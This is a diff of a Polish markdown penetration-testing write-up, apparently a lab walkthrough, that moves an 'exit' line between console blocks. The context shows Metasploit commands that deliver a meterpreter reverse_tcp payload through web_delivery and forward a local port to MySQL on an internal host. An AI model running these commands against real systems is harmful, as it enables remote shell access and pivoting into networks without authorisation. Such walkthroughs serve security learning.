@@ -352,9 +352,6 @@ Wracamy do Metasploita. Na ip **172.31.20.10**, porcie **3306** jest **MYSQL**. 
 {: .text-justify}
 <div class="notice--primary" markdown="1">
 ```console
-msf6 exploit(multi/script/web_delivery) > exit
-```
-```console
 use multi/script/web_delivery
 set payload linux/x86/meterpreter/reverse_tcp
 set target Linux
@@ -364,6 +361,7 @@ sessions 1
 portfwd add -l 3307 -p 3306 -r 172.31.20.10
 ```
 ```console
+msf6 exploit(multi/script/web_delivery) > exit
 [*] Server stopped.
 root@kali:/home/szikers# msfconsole
 [*] Using configured payload linux/x86/meterpreter/reverse_tcp
